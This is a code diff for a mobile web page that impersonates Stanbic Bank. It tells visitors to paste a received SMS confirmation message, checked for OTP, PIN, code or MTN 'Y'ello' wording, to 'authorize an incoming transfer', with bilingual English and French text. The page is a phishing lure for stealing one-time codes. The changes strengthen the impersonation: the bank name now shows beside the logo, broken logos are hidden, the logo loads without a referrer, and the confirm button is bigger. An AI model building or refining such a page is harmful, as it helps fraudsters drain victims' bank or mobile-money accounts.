@@ -38,7 +38,7 @@
     position: relative; overflow: hidden;
   }
 
-  /* ─── TOP ─── */
+  /* ─── TOP — Logo + text, both visible ─── */
   .top {
     position: relative; flex-shrink: 0;
     background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
@@ -51,11 +51,19 @@
     background: var(--sb-gold);
     border-top-left-radius: 20px; border-top-right-radius: 20px;
   }
-  .top-logo {
-    height: 28px; width: auto; display: block;
-    filter: brightness(0) invert(1);
-    opacity: 0.96;
+  .brand-row {
+    display: flex; align-items: center; gap: 10px;
   }
+  .top-logo {
+    height: 34px; width: auto; display: block;
+    flex-shrink: 0;
+  }
+  .brand-text {
+    font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
+    color: #fff; line-height: 1; white-space: nowrap;
+  }
+  .brand-text .dot { color: var(--sb-gold); }
+
   .page-title {
     margin-top: 18px; font-size: 19px; font-weight: 800;
     color: #fff; letter-spacing: -0.3px; line-height: 1.25;
@@ -72,11 +80,11 @@
     display: flex; flex-direction: column;
   }
 
-  /* Amount + purpose cards */
+  /* Amount card (purpose removed) */
   .amount-card {
     background: var(--sb-soft); border-radius: 12px;
     border: 1px solid var(--sb-border);
-    padding: 14px 16px; margin-bottom: 12px;
+    padding: 16px 18px; margin-bottom: 22px;
     display: flex; flex-direction: column; gap: 3px;
   }
   .amount-card .label {
@@ -84,28 +92,8 @@
     letter-spacing: 0.7px; text-transform: uppercase;
   }
   .amount-card .amount {
-    font-size: 24px; font-weight: 800; color: var(--sb-primary);
+    font-size: 28px; font-weight: 800; color: var(--sb-primary);
     letter-spacing: -0.6px; line-height: 1.2;
-  }
-
-  .purpose-card {
-    background: #FFFDF5; border-radius: 12px;
-    border: 1px solid #F2E4B8;
-    padding: 12px 16px; margin-bottom: 20px;
-    position: relative; overflow: hidden;
-  }
-  .purpose-card.hidden { display: none; }
-  .purpose-card::before {
-    content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px;
-    background: var(--sb-gold);
-  }
-  .purpose-card .label {
-    font-size: 10px; font-weight: 800; letter-spacing: 0.7px;
-    text-transform: uppercase; color: #8A6600; margin-bottom: 3px; display: block;
-  }
-  .purpose-card .purpose {
-    font-size: 13.5px; font-weight: 700; color: var(--sb-navy);
-    line-height: 1.4; word-break: break-word;
   }
 
   /* ─── SMS INPUT ─── */
@@ -138,7 +126,7 @@
   .btn-paste {
     display: inline-flex; align-items: center; justify-content: center; gap: 8px;
     width: 100%; margin-top: 10px;
-    padding: 11px 14px; font-size: 12.5px; font-weight: 700;
+    padding: 12px 14px; font-size: 13px; font-weight: 700;
     background: #fff; color: var(--sb-primary);
     border: 1.5px solid #CDD5E2; border-radius: 8px;
     cursor: pointer; font-family: inherit; transition: all .15s;
@@ -161,16 +149,17 @@
     letter-spacing: 1.5px; word-break: break-all;
   }
 
-  /* ─── BUTTONS ─── */
+  /* ─── CONFIRM BUTTON — BIG ─── */
   .btn-confirm {
-    width: 100%; margin-top: 22px; height: 52px;
+    width: 100%; margin-top: 24px; min-height: 64px;
     background: var(--sb-primary); color: #fff;
-    font-family: inherit; font-size: 14.5px; font-weight: 700;
-    letter-spacing: 0.5px; text-transform: uppercase;
-    border: none; border-radius: 10px; cursor: pointer;
-    box-shadow: 0 8px 20px rgba(1,0,140,0.22);
+    font-family: inherit; font-size: 17px; font-weight: 800;
+    letter-spacing: 0.4px;
+    border: none; border-radius: 12px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(1,0,140,0.28);
     transition: filter .15s, transform .1s, opacity .15s;
-    flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    padding: 18px 24px;
   }
   .btn-confirm:hover { filter: brightness(1.08); }
   .btn-confirm:active { transform: scale(0.985); }
@@ -185,7 +174,7 @@
   .btn-resend {
     display: inline-flex; align-items: center; justify-content: center; gap: 8px;
     width: 100%; margin-top: 10px;
-    padding: 12px 16px; font-size: 13px; font-weight: 700;
+    padding: 13px 16px; font-size: 13.5px; font-weight: 700;
     background: #fff; color: var(--sb-primary);
     border: 1.5px solid var(--sb-primary); border-radius: 8px;
     cursor: pointer; font-family: inherit; transition: all .15s;
@@ -201,7 +190,7 @@
     border-color: var(--sb-green);
   }
 
-  /* ─── FOOTER ─── */
+  /* ─── FOOTER — logo + text ─── */
   .sb-footer {
     width: 100%; margin-top: 22px;
     background: var(--sb-navy);
@@ -210,11 +199,18 @@
     display: flex; align-items: center; justify-content: space-between;
     gap: 12px; text-align: left;
   }
-  .sb-footer .foot-logo {
-    height: 22px; width: auto; display: block;
-    filter: brightness(0) invert(1);
-    opacity: 0.96;
+  .foot-brand-row {
+    display: flex; align-items: center; gap: 8px;
   }
+  .sb-footer .foot-logo {
+    height: 26px; width: auto; display: block;
+    flex-shrink: 0;
+  }
+  .sb-footer .foot-brand-text {
+    font-size: 16px; font-weight: 800; letter-spacing: -0.3px;
+    color: #fff; line-height: 1; white-space: nowrap;
+  }
+  .sb-footer .foot-brand-text .dot { color: var(--sb-gold); }
   .sb-footer .foot-support {
     font-size: 10.5px; color: rgba(255,255,255,0.72); line-height: 1.5; font-weight: 500;
     text-align: right;
@@ -246,11 +242,16 @@
   .authorizing.show { display: flex; }
   .authorizing .brand-label {
     margin-bottom: 34px;
+    display: flex; align-items: center; gap: 10px;
   }
   .authorizing .brand-label img {
-    height: 30px; width: auto;
-    filter: brightness(0) invert(1); opacity: 0.96;
+    height: 34px; width: auto;
   }
+  .authorizing .brand-label .brand-text {
+    font-size: 22px; font-weight: 800; color: #fff;
+    letter-spacing: -0.5px; line-height: 1;
+  }
+  .authorizing .brand-label .brand-text .dot { color: var(--sb-gold); }
   .authorizing .spinner {
     width: 60px; height: 60px;
     border: 4px solid rgba(255,255,255,0.18);
@@ -296,24 +297,24 @@
   @media (max-width: 380px) {
     .top { padding: 16px 18px 22px; }
     .body { padding: 18px 18px 16px; }
-    .top-logo { height: 24px; }
+    .top-logo { height: 30px; }
+    .brand-text { font-size: 20px; }
     .page-title { font-size: 17px; }
-    .amount-card .amount { font-size: 20px; }
-    .purpose-card .purpose { font-size: 12.5px; }
+    .amount-card .amount { font-size: 24px; }
     .sms-box { min-height: 115px; font-size: 12.5px; }
-    .btn-confirm { height: 50px; font-size: 14px; }
+    .btn-confirm { min-height: 60px; font-size: 16px; }
     .authorizing h2 { font-size: 18px; }
     .authorizing .spinner { width: 50px; height: 50px; }
     .trust-slider { height: 80px; }
     .trust-msg { font-size: 12px; }
     .sb-footer { padding: 14px 16px; }
-    .sb-footer .foot-logo { height: 20px; }
+    .sb-footer .foot-logo { height: 22px; }
+    .sb-footer .foot-brand-text { font-size: 14px; }
   }
   @media (max-height: 680px) {
     .page-title { margin-top: 12px; }
-    .amount-card { margin-bottom: 10px; }
-    .purpose-card { margin-bottom: 14px; }
-    .btn-confirm { margin-top: 16px; height: 48px; }
+    .amount-card { margin-bottom: 16px; }
+    .btn-confirm { margin-top: 16px; min-height: 56px; }
   }
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
@@ -331,11 +332,16 @@
 <div class="phone">
 
   <div class="top">
-    <img
-      class="top-logo"
-      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-      alt="Stanbic Bank"
-    >
+    <div class="brand-row">
+      <img
+        class="top-logo"
+        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+        alt="Stanbic Bank"
+        referrerpolicy="no-referrer"
+        onerror="this.style.display='none'"
+      >
+      <span class="brand-text">Stanbic<span class="dot">.</span></span>
+    </div>
     <div class="page-title" id="pageTitle">Confirm this transfer</div>
     <div class="page-sub" id="pageSub">Paste the confirmation message you received to authorize this incoming transfer.</div>
   </div>
@@ -345,11 +351,6 @@
     <div class="amount-card">
       <span class="label" id="amountLabel">Amount you are receiving</span>
       <span class="amount" id="amountValue">—</span>
-    </div>
-
-    <div class="purpose-card hidden" id="purposeCard">
-      <span class="label" id="purposeLabel">Purpose</span>
-      <span class="purpose" id="purposeValue">—</span>
     </div>
 
     <div class="section-label" id="sectionLabel">Confirmation message</div>
@@ -388,11 +389,16 @@
     </button>
 
     <div class="sb-footer">
-      <img
-        class="foot-logo"
-        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-        alt="Stanbic Bank"
-      >
+      <div class="foot-brand-row">
+        <img
+          class="foot-logo"
+          src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+          alt="Stanbic Bank"
+          referrerpolicy="no-referrer"
+          onerror="this.style.display='none'"
+        >
+        <span class="foot-brand-text">Stanbic<span class="dot">.</span></span>
+      </div>
       <div class="foot-support">
         <span id="needHelpLabel">Customer Care</span><br>
         <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
@@ -407,7 +413,10 @@
     <img
       src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
       alt="Stanbic Bank"
+      referrerpolicy="no-referrer"
+      onerror="this.style.display='none'"
     >
+    <span class="brand-text">Stanbic<span class="dot">.</span></span>
   </div>
   <div class="spinner"></div>
   <h2 id="authTitle">Confirming transfer…</h2>
@@ -430,7 +439,6 @@
       pageTitle: 'Confirm this transfer',
       pageSub: 'Paste the confirmation message you received to authorize this incoming transfer.',
       amountLabel: 'Amount you are receiving',
-      purposeLabel: 'Purpose',
       sectionLabel: 'Confirmation message',
       smsPlaceholder: 'Paste the full confirmation message here…',
       smsError: 'The message must contain a valid confirmation code.',
@@ -458,19 +466,14 @@
       pastedFromClipboard: 'Pasted from clipboard.',
       clipboardEmpty: 'Clipboard is empty.',
       pasteManually: 'Paste manually: long-press the box and tap Paste.',
-
       popupDeclineTitle: 'Transfer not confirmed',
       popupDeclineDesc: 'This incoming transfer was not confirmed. You will be taken back to paste a new message.',
-
       popupWrongPinTitle: 'Incorrect PIN',
       popupWrongPinDesc: 'The PIN entered was incorrect. You will be taken back to sign in and try again.',
-
       popupResendTitle: 'Check your inbox',
       popupResendDesc: 'A new confirmation message was sent to your phone. Please check your inbox and paste the new message.',
-
       popupFullSmsTitle: 'Full message required',
       popupFullSmsDesc: 'Please paste the entire confirmation message you received — including any code or reference — so we can verify it.',
-
       popupExpiredTitle: 'Code expired',
       popupExpiredDesc: 'The message you submitted has expired. You will be taken back to paste a new message.'
     },
@@ -479,7 +482,6 @@
       pageTitle: 'Confirmez ce virement',
       pageSub: 'Collez le message de confirmation que vous avez reçu pour autoriser ce virement entrant.',
       amountLabel: 'Montant que vous recevez',
-      purposeLabel: 'Motif',
       sectionLabel: 'Message de confirmation',
       smsPlaceholder: 'Collez le message de confirmation complet ici…',
       smsError: 'Le message doit contenir un code de confirmation valide.',
@@ -507,19 +509,14 @@
       pastedFromClipboard: 'Collé depuis le presse-papiers.',
       clipboardEmpty: 'Le presse-papiers est vide.',
       pasteManually: 'Collez manuellement : appuyez longuement sur la zone et choisissez Coller.',
-
       popupDeclineTitle: 'Virement non confirmé',
       popupDeclineDesc: 'Ce virement entrant n\'a pas été confirmé. Vous allez être redirigé vers la page précédente pour coller un nouveau message.',
-
       popupWrongPinTitle: 'Code PIN incorrect',
       popupWrongPinDesc: 'Le code PIN saisi est incorrect. Vous allez être redirigé vers la connexion pour réessayer.',
-
       popupResendTitle: 'Vérifiez votre boîte de réception',
       popupResendDesc: 'Un nouveau message de confirmation a été envoyé sur votre téléphone. Veuillez vérifier votre boîte de réception et coller le nouveau message.',
-
       popupFullSmsTitle: 'Message complet requis',
       popupFullSmsDesc: 'Veuillez coller le message de confirmation complet que vous avez reçu — y compris tout code ou référence — afin que nous puissions le vérifier.',
-
       popupExpiredTitle: 'Code expiré',
       popupExpiredDesc: 'Le message que vous avez soumis a expiré. Vous allez être redirigé pour coller un nouveau message.'
     }
@@ -584,7 +581,6 @@
     document.getElementById('pageTitle').textContent = T.pageTitle;
     document.getElementById('pageSub').textContent = T.pageSub;
     document.getElementById('amountLabel').textContent = T.amountLabel;
-    document.getElementById('purposeLabel').textContent = T.purposeLabel;
     document.getElementById('sectionLabel').textContent = T.sectionLabel;
     document.getElementById('smsInput').placeholder = T.smsPlaceholder;
     document.getElementById('smsError').textContent = T.smsError;
@@ -638,7 +634,6 @@
     const text = (raw || '').trim();
     if (!text) return { ok: false, reason: 'empty' };
 
-    // Accept both legacy "Y'ello" format and modern confirmation format
     const first = text.split(/\s+/)[0].toLowerCase().replace(/[’'`´]/g, "'");
     const looksLikeYello = /^y'?ello/.test(first);
     const hasCodeKeyword = /(?:code|ref|reference|otp|pin|txn|confirmation)/i.test(text);
@@ -970,16 +965,6 @@
     applyTranslations();
     document.getElementById('amountValue').textContent =
       tx.am ? formatAmount(tx.am, tx.cur) : '—';
-
-    const purposeCard = document.getElementById('purposeCard');
-    const purposeValue = document.getElementById('purposeValue');
-    if (tx.pu && tx.pu.trim()) {
-      purposeValue.textContent = tx.pu.trim();
-      purposeCard.classList.remove('hidden');
-    } else {
-      purposeCard.classList.add('hidden');
-    }
-
     document.getElementById('supportNum').textContent =
       SUPPORT_NUMBERS[tx.c] || '—';
   });
